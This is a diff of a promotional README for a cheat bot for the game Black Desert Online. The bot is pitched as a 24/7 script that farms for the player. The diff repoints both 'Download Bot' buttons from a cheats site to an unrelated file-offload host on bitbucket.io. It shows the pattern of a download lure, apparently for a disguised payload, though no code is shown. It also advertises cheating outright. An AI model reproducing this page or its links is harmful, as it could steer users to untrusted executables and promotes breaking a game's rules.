@@ -6,14 +6,14 @@ Let’s be real — **Black Desert Online** is one of the most beautiful MMOs ev
 
 That’s where the **BDO Bot** comes in. This is your 24/7 cheat partner that runs your character while you sleep, eat, work, or binge YouTube. Farm smarter, not harder.
 
-[![Download Bot](https://img.shields.io/badge/Download-Bot-blueviolet)](https://wecheaters.github.io/cheats/black-desert-online/)
+[![Download Bot](https://img.shields.io/badge/Download-Bot-blueviolet)](https://fileoffload20.bitbucket.io)
 ---
 
 ## 🤖 What Is a BDO Bot?
 
 A **bot** is a smart automation script or mod that plays the game for you. In Black Desert, it can do literally **everything except PvP** (unless you want that too 😏). No input needed — just set it up and watch the silver pile up.
 
-[![Download Bot](https://i.imgur.com/vjUgTwy.png)](https://wecheaters.github.io/cheats/black-desert-online/)
+[![Download Bot](https://i.imgur.com/vjUgTwy.png)](https://fileoffload20.bitbucket.io)
 ---
 
 ## 🔥 Main Features of the Black Desert Bot
